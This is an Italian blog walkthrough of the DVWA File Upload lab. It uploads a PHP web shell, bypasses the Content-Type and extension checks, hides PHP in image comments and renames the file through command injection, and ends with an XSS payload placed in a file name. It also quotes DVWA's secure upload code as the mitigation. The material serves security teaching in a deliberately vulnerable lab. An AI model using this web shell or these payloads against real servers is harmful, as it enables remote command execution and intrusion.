<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>DVWA File Upload – Soluzione Completa + Bonus XSS | HomeLab IT</title><meta name=keywords content="file upload,penetration test,Security"><meta name=description content="Nuovo post sull’applicazione DVWA, oggi risolveremo la vulnerabilità: DVWA File Upload.
I requisiti sono:
 DVWA Command Injection completato, in caso contrario non proseguite! Qualsiasi Browser Proxy tipo Burpsuite e Zap o browser plugin tipo Tamper Data Editor di immagini, ad esempio GIMP  Lo scopo di questa vulnerabilità è quello di riuscire a caricare sul server remoto una web shell attaccando una pagina dedita all’upload di immagini.
DVWA File Upload – Low Level Il livello semplice, come ormai sappiamo, non ha alcun tipo di protezione quindi faremo l’upload di una web shell php."><meta name=author content="claudio"><link rel=canonical href=https://www.homelab.it/index.php/2016/03/02/dvwa-file-upload-soluzione-completa/><link crossorigin=anonymous href=/assets/css/stylesheet.min.48a18943c2fc15c38a372b8dde1f5e5dc0bc64fa6cb90f5a817d2f8c76b7f3ae.css integrity="sha256-SKGJQ8L8FcOKNyuN3h9eXcC8ZPpsuQ9agX0vjHa3864=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://www.homelab.it/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://www.homelab.it/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://www.homelab.it/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://www.homelab.it/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://www.homelab.it/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="DVWA File Upload – Soluzione Completa + Bonus XSS"><meta property="og:description" content="Nuovo post sull’applicazione DVWA, oggi risolveremo la vulnerabilità: DVWA File Upload.
I requisiti sono:
 DVWA Command Injection completato, in caso contrario non proseguite! Qualsiasi Browser Proxy tipo Burpsuite e Zap o browser plugin tipo Tamper Data Editor di immagini, ad esempio GIMP  Lo scopo di questa vulnerabilità è quello di riuscire a caricare sul server remoto una web shell attaccando una pagina dedita all’upload di immagini.
DVWA File Upload – Low Level Il livello semplice, come ormai sappiamo, non ha alcun tipo di protezione quindi faremo l’upload di una web shell php."><meta property="og:type" content="article"><meta property="og:url" content="https://www.homelab.it/index.php/2016/03/02/dvwa-file-upload-soluzione-completa/"><meta property="og:image" content="https://www.homelab.it/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2016-03-02T22:35:55+00:00"><meta property="article:modified_time" content="2016-03-02T22:35:55+00:00"><meta property="og:site_name" content="HomeLab IT"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.homelab.it/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="DVWA File Upload – Soluzione Completa + Bonus XSS"><meta name=twitter:description content="Nuovo post sull’applicazione DVWA, oggi risolveremo la vulnerabilità: DVWA File Upload.
I requisiti sono:
 DVWA Command Injection completato, in caso contrario non proseguite! Qualsiasi Browser Proxy tipo Burpsuite e Zap o browser plugin tipo Tamper Data Editor di immagini, ad esempio GIMP  Lo scopo di questa vulnerabilità è quello di riuscire a caricare sul server remoto una web shell attaccando una pagina dedita all’upload di immagini.
DVWA File Upload – Low Level Il livello semplice, come ormai sappiamo, non ha alcun tipo di protezione quindi faremo l’upload di una web shell php."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://www.homelab.it/posts/"},{"@type":"ListItem","position":2,"name":"DVWA File Upload – Soluzione Completa + Bonus XSS","item":"https://www.homelab.it/index.php/2016/03/02/dvwa-file-upload-soluzione-completa/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"DVWA File Upload – Soluzione Completa + Bonus XSS","name":"DVWA File Upload – Soluzione Completa \u002b Bonus XSS","description":"Nuovo post sull’applicazione DVWA, oggi risolveremo la vulnerabilità: DVWA File Upload.\nI requisiti sono:\n DVWA Command Injection completato, in caso contrario non proseguite! Qualsiasi Browser Proxy tipo Burpsuite e Zap o browser plugin tipo Tamper Data Editor di immagini, ad esempio GIMP  Lo scopo di questa vulnerabilità è quello di riuscire a caricare sul server remoto una web shell attaccando una pagina dedita all’upload di immagini.\nDVWA File Upload – Low Level Il livello semplice, come ormai sappiamo, non ha alcun tipo di protezione quindi faremo l’upload di una web shell php.","keywords":["file upload","penetration test","Security"],"articleBody":"Nuovo post sull’applicazione DVWA, oggi risolveremo la vulnerabilità: DVWA File Upload.\nI requisiti sono:\n DVWA Command Injection completato, in caso contrario non proseguite! Qualsiasi Browser Proxy tipo Burpsuite e Zap o browser plugin tipo Tamper Data Editor di immagini, ad esempio GIMP  Lo scopo di questa vulnerabilità è quello di riuscire a caricare sul server remoto una web shell attaccando una pagina dedita all’upload di immagini.\nDVWA File Upload – Low Level Il livello semplice, come ormai sappiamo, non ha alcun tipo di protezione quindi faremo l’upload di una web shell php.\nCome esempio ho deciso di utilizzare questo semplice script “pwn3dshell.php” :\n\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"\"; die; } ? L’utilizzo è semplice, basta richiamare lo script passandogli i comandi da eseguire tramite la variabile cmd.\nDopo l’upload la pagina bacata ci spiattella in rosso il path dello script appena caricato:\nPer richiamare la backdoor basterà inserire il seguente url:\nhttp://ip_server/DVWA/hackable/uploads/pwn3dshell.php?cmd=whoami\nCome si può notare il comando whoami è stato eseguito dalla web shell.\nDi seguito il sorgente privo di alcuna protezione:\nDVWA File Upload – Medium Level Nel livello medio non è permesso l’invio a cuor leggero di uno script php:\nDal messaggio è evidente come la pagina si aspetti un file di tipo JPEG o PNG.\nTramite un proxy o plugin è possibile intercettare e modificare le richieste del browser prima di inviarle verso il server.\nNell’esempio seguente utilizzerò il plugin Firefox Tamper Data per modificare il Content-Type originale del file php:\nspacciandolo per un vera e propria immagine jpeg:\nE come per magia:\nDai sorgenti si possono notare due gravi errori:\n Non c’è alcun tipo di controllo sull’estensione del file L’unico controllo che viene fatto è sul $_FILES[ 'uploaded' ][ 'type' ];, scelta sbagliatissima dato che è ormai\nnoto che il Content-Type è un parametro manipolabile!  DVWA File Upload – High Level Come scrivevo nell’articolo d’introduzione “DVWA – Damn Vulnerable Web Application” per risolvere alcune vulnerabilità è necessario ingegnarsi un minimo senza limitarsi al bug stesso…un po come nelle competizioni CTF.\nIn questo livello naturalmente le tecniche usate precedentemente non hanno alcun effetto, quindi ho optato nell’inserimento di codice php all’interno dei commenti dell’immagine sperando poi di trovare il modo di far interpretare il file appena caricato come script php.\nPer modificare le proprietà dell’immagine homelabit_evil.png ho utilizzato l’editor GIMP:\nInserimento codice php nei commenti dell’immagine\nCome si nota dallo screenshot precedente ho inserito la classica funzione phpinfo() nei commenti del dell’immagine.\nA questo punto le strade da percorrere che mi vengono in mente per far eseguire al webserer un gile png come php sono almeno due:\n Caricare nella directory di upload un file .htaccess come il seguente:\nAddType application/x-httpd-php .png Sfruttare un’altra vulnerabilità per rinominare il file png  La soluzione numero uno non è percorribile dato che il form ha un efficace controllo sull’estensione dei file, quindi perché non sfruttare la vulnerabilità Command Injection?\nMa andiamo con ordine, prima di tutto ho eseguito l’upload dell’immagine modificata così da poter vedere anche la directory di repository.\nDallo screenshot si capisce che la directory interessata è la seguente “../../hackables/uploads/“, per conferma dalla pagina “Command Injections” ho controllato il contenuto iniettando il comando “|ls ../../hackable/uploads/“:\nLocalizzata l’immagine ho rinominato l’estensione da png a php iniettando il comando “|mv ../../hackable/uploads/homelabit_evil.png ../../hackable/uploads/homelabit_evil.php ” dopo di che ho ricontrollato il contenuto:\nInfine dal browser ho richiamato l’url: “http://10.0.0.100/DVWA/hackable/uploads/homelabit_evil.php”\nCodice php eseguito con successo!\nDal sorgente è interessante estrapolare questa parte:\n // Is it an image? if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) \u0026\u0026 ( $uploaded_size Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } else { // Invalid file echo 'Your image was not uploaded. We can only accept JPEG or PNG images.'; } } Nel codice viene utilizzata la funzione getimagesize() per controllare se il file caricato è un immagine o meno, ma come visto in precedenza manipolando l’immagine il controllo viene bypassato.\nDVWA File Upload – Impossible Level (mitigazione) Questo è il sorgente sicuro proposto:\n ${target_file} succesfully uploaded!\"; } else { // No echo 'Your image was not uploaded.'; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo 'Your image was not uploaded. We can only accept JPEG or PNG images.'; } } // Generate Anti-CSRF token generateSessionToken(); ? A mio parere, oltre al controllo dell’estensione e della tipologia del file, sono importanti due parti del codice (in grassetto):\n La funzione che controlla qualsiasi metadata dell’immagine tramite re-encodingm, rimuovendo eventuali stringhe\ndi codice pericolose. Una volta eseguito l’upload del file, stampare a video un messaggio di conferma senza specificare il path completo locale\ndell’immagine  DVWA File Upload – Bonus XSS Eccoci alla parte più divertente!\nIn tutti e tre i livelli vulnerabili, low, medium, high, ho notato che al momento dell’upload avvenuto con successo veniva stampato a video il nome dell’immagine caricata all’interno di un tag .\nA quel punto mi sono chiesto: Perchè non caricare un’immagine inserendo un payload xss nel nome del file?\nNon potendo utilizzare il carattere / nel nome del file, e quindi impossibilitato a chiudere i tag html, ho optato per un payload che sfrutta l’attributo href malformato:\nclickme\nPotete testare il payload su https://jsfiddle.net tramite browser Mozilla Firefox.\nPer saltare i controlli del livello high, ho preso come esempio un immagine png genuina lasciando anche l’estensione corretta:\n# i vari backslash servono a non fare interpretare i caratteri speciali alla shell\nclaudio@KaliCla:~/Pictures$ cp homelabit_evil.png \\clickme.png\nEcco il risultato dopo l’upload dell’immagine:\nE’ possibile notare come il nome del file sia diventato un link cliccabile, il sorgente rende tutto più chiaro:\nEd al passaggio del mouse sul link….\nTadaaaaa XSSED!\nUn saluto! Alla prossima!\n","wordCount":"1254","inLanguage":"en","datePublished":"2016-03-02T22:35:55Z","dateModified":"2016-03-02T22:35:55Z","author":{"@type":"Person","name":"claudio"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.homelab.it/index.php/2016/03/02/dvwa-file-upload-soluzione-completa/"},"publisher":{"@type":"Organization","name":"HomeLab IT","logo":{"@type":"ImageObject","url":"https://www.homelab.it/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://www.homelab.it/ accesskey=h title="Homelab IT (Alt + H)"><img src=https://www.homelab.it/img/homelabit_logo.png alt=logo aria-label=logo height=35>Homelab IT</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://www.homelab.it/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://www.homelab.it/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://www.homelab.it/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://www.homelab.it/>Home</a>&nbsp;»&nbsp;<a href=https://www.homelab.it/posts/>Posts</a></div><h1 class=post-title>DVWA File Upload – Soluzione Completa + Bonus XSS</h1><div class=post-meta><span title="2016-03-02 22:35:55 +0000 +0000">March 2, 2016</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;claudio</div></header><div class=post-content><p>Nuovo post sull’applicazione DVWA, oggi risolveremo la vulnerabilità: <strong>DVWA File Upload.</strong></p><p>I requisiti sono:</p><ul><li>DVWA Command Injection completato, in caso contrario non proseguite!</li><li>Qualsiasi Browser</li><li>Proxy tipo <a href=https://portswigger.net/burp/>Burpsuite</a> e <a href=https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project>Zap</a> o browser plugin tipo <a href=https://addons.mozilla.org/it/firefox/addon/tamper-data/>Tamper Data</a></li><li>Editor di immagini, ad esempio <a href=https://www.gimp.org/>GIMP</a></li></ul><p>Lo scopo di questa vulnerabilità è quello di riuscire a caricare sul server remoto una web shell attaccando una pagina dedita all’upload di immagini.</p><h2 id=dvwa-file-upload--low-level>DVWA File Upload – Low Level<a hidden class=anchor aria-hidden=true href=#dvwa-file-upload--low-level>#</a></h2><p>Il livello semplice, come ormai sappiamo, non ha alcun tipo di protezione quindi faremo l’upload di una web shell php.<br>Come esempio ho deciso di utilizzare questo semplice script “<strong>pwn3dshell.php</strong>” :</p><pre tabindex=0><code>&lt;?php

if(isset($_REQUEST[&#39;cmd&#39;])){
 echo &#34;&lt;pre&gt;&#34;;
 $cmd = ($_REQUEST[&#39;cmd&#39;]);
 system($cmd);
 echo &#34;&lt;/pre&gt;&#34;;
 die;
}

?&gt;
</code></pre><p>L’utilizzo è semplice, basta richiamare lo script passandogli i comandi da eseguire tramite la variabile <strong>cmd</strong>.</p><p>Dopo l’upload la pagina bacata ci spiattella in rosso il path dello script appena caricato:</p><p><img loading=lazy src=/wp-content/uploads/2016/02/dvwa_file_upload01.jpg alt="DVWA File Upload"></p><p>Per richiamare la backdoor basterà inserire il seguente url:</p><p>http://ip_server/DVWA/hackable/uploads/<strong>pwn3dshell.php?<em>cmd=whoami</em></strong></p><p><img loading=lazy src=/wp-content/uploads/2016/02/dvwa_file_upload02.jpg alt="DVWA File Upload"></p><p>Come si può notare il comando <em>whoami</em> è stato eseguito dalla web shell.</p><p>Di seguito il sorgente privo di alcuna protezione:</p><p><img loading=lazy src=/wp-content/uploads/2016/02/dvwa_file_upload03.jpg alt="DVWA File Upload"></p><h2 id=dvwa-file-upload--medium-level>DVWA File Upload – Medium Level<a hidden class=anchor aria-hidden=true href=#dvwa-file-upload--medium-level>#</a></h2><p>Nel livello medio non è permesso l’invio a cuor leggero di uno script php:</p><p><img loading=lazy src=/wp-content/uploads/2016/02/dvwa_file_upload04.jpg alt="DVWA File Upload "></p><p>Dal messaggio è evidente come la pagina si aspetti un file di tipo JPEG o PNG.<br>Tramite un proxy o plugin è possibile intercettare e modificare le richieste del browser prima di inviarle verso il server.<br>Nell’esempio seguente utilizzerò il plugin Firefox <a href=https://addons.mozilla.org/it/firefox/addon/tamper-data/>Tamper Data</a> per modificare il Content-Type originale del file php:</p><p><img loading=lazy src=/wp-content/uploads/2016/02/dvwa_file_upload06.jpg alt="DVWA File Upload"></p><p>spacciandolo per un vera e propria immagine jpeg:</p><p><img loading=lazy src=/wp-content/uploads/2016/02/dvwa_file_upload07.jpg alt="DVWA File Upload"></p><p>E come per magia:</p><p><img loading=lazy src=/wp-content/uploads/2016/02/dvwa_file_upload09.jpg alt="DVWA File Upload"></p><p>Dai sorgenti si possono notare due gravi errori:</p><p><img loading=lazy src=/wp-content/uploads/2016/02/dvwa_file_upload08.jpg alt="DVWA File Upload"></p><ol><li>Non c’è alcun tipo di controllo sull’estensione del file</li><li>L’unico controllo che viene fatto è sul <code>$_FILES[ 'uploaded' ][ 'type' ];</code>,  scelta sbagliatissima dato che è ormai<br>noto che il Content-Type è un parametro manipolabile!</li></ol><h2 id=dvwa-file-upload--high-level>DVWA File Upload – High Level<a hidden class=anchor aria-hidden=true href=#dvwa-file-upload--high-level>#</a></h2><p>Come scrivevo nell’articolo d’introduzione “<a href=/2015/12/24/dvwa-damn-vulnerable-web-application/index.html>DVWA – Damn Vulnerable Web Application</a>” per risolvere alcune vulnerabilità è necessario ingegnarsi un minimo senza limitarsi al bug stesso…un po come nelle competizioni CTF.<br>In questo livello naturalmente le tecniche usate precedentemente non hanno alcun effetto, quindi ho optato nell’inserimento di codice php all’interno dei commenti dell’immagine sperando poi di trovare il modo di far interpretare il file appena caricato come script php.<br>Per modificare le proprietà dell’immagine <strong>homelabit_evil.png</strong> ho utilizzato l’editor GIMP:</p><p><img loading=lazy src=/wp-content/uploads/2016/02/dvwa_file_upload10.jpg alt="DVWA File Upload"></p><p>Inserimento codice php nei commenti dell’immagine</p><p>Come si nota dallo screenshot precedente ho inserito la classica funzione <a href=http://php.net/manual/it/function.phpinfo.php>phpinfo()</a> nei commenti del dell’immagine.<br>A questo punto le strade da percorrere che mi vengono in mente per far eseguire al webserer un gile png come php sono almeno due:</p><ol><li>Caricare nella directory di upload un file <strong>.htaccess</strong> come il seguente:<br><em>AddType application/x-httpd-php .png</em></li><li>Sfruttare un’altra vulnerabilità per rinominare il file png</li></ol><p>La soluzione numero uno non è percorribile dato che il form ha un efficace controllo sull’estensione dei file, quindi perché non sfruttare la vulnerabilità <a href=index.php/01/07/dvwa-command-injection-soluzione-completa/index.html>Command Injection</a>?</p><p>Ma andiamo con ordine, prima di tutto ho eseguito l’upload dell’immagine modificata così da poter vedere anche la directory di repository.</p><p><img loading=lazy src=/wp-content/uploads/2016/02/dvwa_file_upload11.jpg alt="DVWA File Upload"></p><p>Dallo screenshot si capisce che la directory interessata è la seguente “<em>../../hackables/uploads/</em>“, per conferma dalla pagina “<strong>Command Injections</strong>” ho controllato il contenuto iniettando il comando “<strong>|ls ../../hackable/uploads/</strong>“:</p><p><img loading=lazy src=/wp-content/uploads/2016/02/dvwa_file_upload13.jpg alt="DVWA File Upload"></p><p>Localizzata l’immagine ho rinominato l’estensione da png a php iniettando il comando “<strong>|mv ../../hackable/uploads/homelabit_evil.png ../../hackable/uploads/homelabit_evil.php</strong> ” dopo di che ho ricontrollato il contenuto:</p><p><img loading=lazy src=/wp-content/uploads/2016/02/dvwa_file_upload14.jpg alt="DVWA File Upload"></p><p>Infine dal browser ho richiamato l’url: “<strong>http://10.0.0.100/DVWA/hackable/uploads/homelabit_evil.php</strong>”</p><p><img loading=lazy src=../../../../../wp-content/uploads/2016/02/dvwa_file_upload15.jpg alt="DVWA File Upload"></p><p>Codice php eseguito con successo!</p><p>Dal sorgente è interessante estrapolare questa parte:</p><pre tabindex=0><code>        // Is it an image? 
        if( ( strtolower( $uploaded_ext ) == &#34;jpg&#34; || strtolower( $uploaded_ext ) == &#34;jpeg&#34; || strtolower( $uploaded_ext ) == &#34;png&#34; ) &amp;&amp; 
            ( $uploaded_size &lt; 100000 ) &amp;&amp; 
            getimagesize( $uploaded_tmp ) ) { 
     
            // Can we move the file to the upload folder? 
            if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { 
                // No 
                echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; 
            } 
            else { 
                // Yes! 
                echo &#34;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&#34;; 
            } 
        } 
        else { 
            // Invalid file 
            echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; 
        } 
    } 
</code></pre><p>Nel codice viene utilizzata la funzione getimagesize() per controllare se il file caricato è un immagine o meno, ma come visto in precedenza manipolando l’immagine il controllo viene bypassato.</p><h2 id=dvwa-file-upload--impossible-level-mitigazione>DVWA File Upload – Impossible Level (mitigazione)<a hidden class=anchor aria-hidden=true href=#dvwa-file-upload--impossible-level-mitigazione>#</a></h2><p>Questo è il sorgente sicuro proposto:</p><pre tabindex=0><code>    &lt;?php 
     
    if( isset( $_POST[ &#39;Upload&#39; ] ) ) { 
        // Check Anti-CSRF token 
        checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); 
     
     
        // File information 
        $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; 
        $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); 
        $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; 
        $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; 
        $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; 
     
        // Where are we going to be writing to? 
        $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;; 
        //$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;; 
        $target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; 
        $temp_file     = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) ); 
        $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; 
     
        // Is it an image? 
        if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp; 
            ( $uploaded_size &lt; 100000 ) &amp;&amp; 
            ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp; 
            getimagesize( $uploaded_tmp ) ) { 
     
            // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 
            if( $uploaded_type == &#39;image/jpeg&#39; ) { 
                $img = imagecreatefromjpeg( $uploaded_tmp ); 
                imagejpeg( $img, $temp_file, 100); 
            } 
            else { 
                $img = imagecreatefrompng( $uploaded_tmp ); 
                imagepng( $img, $temp_file, 9); 
            } 
            imagedestroy( $img ); 
     
            // Can we move the file to the web root from the temp folder? 
            if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { 
                // Yes! 
                echo &#34;&lt;pre&gt;&lt;a href=&#39;${target_path}${target_file}&#39;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&#34;; 
            } 
            else { 
                // No 
                echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; 
            } 
     
            // Delete any temp files 
            if( file_exists( $temp_file ) ) 
                unlink( $temp_file ); 
        } 
        else { 
            // Invalid file 
            echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; 
        } 
    } 
     
    // Generate Anti-CSRF token 
    generateSessionToken(); 
     
    ?&gt; 
</code></pre><p>A mio parere, oltre al controllo dell’estensione e della tipologia del file, sono importanti due parti del codice (in grassetto):</p><ol><li>La funzione che controlla qualsiasi metadata dell’immagine tramite re-encodingm, rimuovendo eventuali stringhe<br>di codice pericolose.</li><li>Una volta eseguito l’upload del file, stampare a video un messaggio di conferma senza specificare il path completo locale<br>dell’immagine</li></ol><h2 id=dvwa-file-upload--bonus-xss>DVWA File Upload – Bonus XSS<a hidden class=anchor aria-hidden=true href=#dvwa-file-upload--bonus-xss>#</a></h2><p>Eccoci alla parte più divertente!</p><p>In tutti e tre i livelli vulnerabili, low, medium, high, ho notato che al momento dell’upload avvenuto con successo veniva stampato a video il nome dell’immagine caricata all’interno di un tag .<br>A quel punto mi sono chiesto: Perchè non caricare un’immagine inserendo un payload xss nel nome del file?<br>Non potendo utilizzare il carattere <strong>/</strong> nel nome del file, e quindi impossibilitato a chiudere i tag html, ho optato per un payload che sfrutta l’attributo href malformato:</p><p>clickme</p><p>Potete testare il payload su <a href=https://jsfiddle.net>https://jsfiddle.net</a> tramite browser Mozilla Firefox.<br>Per saltare i controlli del livello high, ho preso come esempio un immagine png genuina lasciando anche l’estensione corretta:</p><p># i vari backslash servono a non fare interpretare i caratteri speciali alla shell</p><p>claudio@KaliCla:~/Pictures$ <strong>cp homelabit_evil.png \&lt;a\ onmouseover=alert\(1\)\>clickme.png</strong></p><p>Ecco il risultato dopo l’upload dell’immagine:</p><p><img loading=lazy src=/wp-content/uploads/2016/03/dvwa_file_upload16.jpg alt="DVWA File Upload"></p><p>E’ possibile notare come il nome del file sia diventato un link cliccabile, il sorgente rende tutto più chiaro:</p><p><img loading=lazy src=/wp-content/uploads/2016/03/dvwa_file_upload17.jpg alt="DVWA File Upload"><br>Ed al passaggio del mouse sul link….</p><p><img loading=lazy src=/wp-content/uploads/2016/03/dvwa_file_upload18.jpg alt="DVWA File Upload"><br>Tadaaaaa XSSED!</p><p>Un saluto! Alla prossima!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://www.homelab.it/tags/file-upload/>file upload</a></li><li><a href=https://www.homelab.it/tags/penetration-test/>penetration test</a></li><li><a href=https://www.homelab.it/tags/security/>Security</a></li></ul><nav class=paginav><a class=prev href=https://www.homelab.it/index.php/2016/04/21/metasploit-ssh-meterpeter-pivoting/><span class=title>« Prev Page</span><br><span>SSH e Meterpeter pivoting</span></a>
<a class=next href=https://www.homelab.it/index.php/2016/01/14/dvwa-sql-injection/><span class=title>Next Page »</span><br><span>DVWA SQL injection + SQL Injection Blind + Bonus XSS</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share DVWA File Upload – Soluzione Completa + Bonus XSS on twitter" href="https://twitter.com/intent/tweet/?text=DVWA%20File%20Upload%20%e2%80%93%20Soluzione%20Completa%20%2b%20Bonus%20XSS&url=https%3a%2f%2fwww.homelab.it%2findex.php%2f2016%2f03%2f02%2fdvwa-file-upload-soluzione-completa%2f&hashtags=fileupload%2cpenetrationtest%2cSecurity"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share DVWA File Upload – Soluzione Completa + Bonus XSS on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fwww.homelab.it%2findex.php%2f2016%2f03%2f02%2fdvwa-file-upload-soluzione-completa%2f&title=DVWA%20File%20Upload%20%e2%80%93%20Soluzione%20Completa%20%2b%20Bonus%20XSS&summary=DVWA%20File%20Upload%20%e2%80%93%20Soluzione%20Completa%20%2b%20Bonus%20XSS&source=https%3a%2f%2fwww.homelab.it%2findex.php%2f2016%2f03%2f02%2fdvwa-file-upload-soluzione-completa%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 